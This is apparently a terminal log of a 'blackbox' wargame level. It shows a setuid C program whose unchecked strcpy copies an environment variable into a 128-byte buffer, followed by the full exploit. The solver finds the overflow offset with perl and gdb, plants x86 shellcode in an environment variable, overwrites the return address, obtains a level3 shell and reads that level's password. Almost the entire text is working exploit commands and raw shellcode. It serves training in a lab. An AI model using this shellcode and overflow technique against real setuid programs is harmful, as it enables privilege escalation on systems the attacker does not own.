level2@blackbox:~$ ls -al
total 36
drwxr-x---  2 level2 level2  4096 Jul  9  2009 .
drwxr-xr-x 17 root   root    4096 Mar 22  2012 ..
lrwxrwxrwx  1 root   root       9 Jun 17  2009 .bash_history -> /dev/null
-rw-r--r--  1 root   level2   567 Dec 29  2007 .bash_profile
-rw-r--r--  1 root   level2  1834 Dec 29  2007 .bashrc
-rwsr-xr-x  1 level3 level3 12186 Dec 29  2007 getowner
-rw-r--r--  1 root   level2   488 Dec 29  2007 getowner.c
-rw-r--r--  1 root   root       9 Jan 24  2008 password
level2@blackbox:~$ 

/*   getowner.c   */
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
        char *filename;
        char buf[128];

        if((filename = getenv("filename")) == NULL) {
                printf("No filename configured!\n");
                return 1;
        }

        while(*filename == '/')
                filename++;
        strcpy(buf, "/tmp/");
        strcpy(&buf[strlen(buf)], filename);  

        struct stat stbuf;
        stat(buf, &stbuf);
        printf("The owner of this file is: %d\n", stbuf.st_uid);

        return 0;
}

level2@blackbox:/tmp/level2$ export filename=$(perl -e 'print"A"x(200)."BBBB"')   
level2@blackbox:/tmp/level2$ ./getowner 
The owner of this file is: 0
Segmentation fault
level2@blackbox:/tmp/level2$ export filename=$(perl -e 'print"A"x(151)."BBBB"') 
level2@blackbox:/tmp/level2$ gdb -q getowner
Using host libthread_db library "/lib/tls/libthread_db.so.1".
(gdb) r
Starting program: /tmp/level2/getowner 
The owner of this file is: 0

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 
level2@blackbox:/tmp/level2$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
level2@blackbox:/tmp/level2$ mv getenv getenvev
level2@blackbox:/tmp/level2$ ./getenvev PAYLOAD
PAYLOAD is at 0xbfffdfc1
level2@blackbox:/tmp/level2$ export filename=$(perl -e 'print"A"x(151)."\xc1\xdf\xff\xbf"')    
level2@blackbox:/tmp/level2$ ./getenvev PAYLOAD
PAYLOAD is at 0xbfffdfc1
level2@blackbox:~$ ./getowner 
The owner of this file is: 0
level3@blackbox:/home/level2$ cd /home/level3
level3@blackbox:/home/level3$ ls
PID  password  proclist  proclist.cc
level3@blackbox:/home/level3$ cat password 
OverTheFlow
level3@blackbox:/home/level3$

